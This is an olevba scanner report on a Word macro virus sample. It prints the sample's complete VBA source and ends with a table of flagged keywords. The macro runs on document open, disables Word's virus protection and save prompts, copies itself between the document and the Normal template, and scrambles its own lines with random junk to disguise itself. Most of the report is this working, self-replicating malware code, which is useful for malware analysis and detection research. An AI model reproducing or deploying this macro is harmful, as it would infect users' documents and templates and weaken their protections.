olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-e595c65e84b41f8d2d38ace2ecd332304e1e0c48
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-e595c65e84b41f8d2d38ace2ecd332304e1e0c48 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

On Error Resume Next

Options.VirusProtection = 0

RB13 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

Application.EnableCancelKey = 0

Options.ConfirmConversions = 0

Options.SaveNormalPrompt = 0

FD24 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set CA24 = ActiveDocument.VBProject.VBComponents.Item(1)

BV95 = True

End If

If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set CA24 = NormalTemplate.VBProject.VBComponents.Item(1)

QL29 = True

End If

If QL29 <> True And BV95 <> True Then GoTo KS60

If QL29 = True Then CA24.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, FD24 - 1))

If BV95 = True Then CA24.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, RB13 - 1))

With CA24.CodeModule

For x = 2 To (CA24.CodeModule.CountOfLines - 1) Step 2

For y = 1 To (Int(Rnd * 10) + 2)

GB26 = GB26 + (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & " + "

Next y

.replaceline x, (Chr(65 + Int(Rnd * 22))) & " = " & GB26 & (Chr(65 + Int(Rnd * 22)))

GB26 = ""

Next x

End With

KS60:

If RB13 <> 0 And FD24 = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

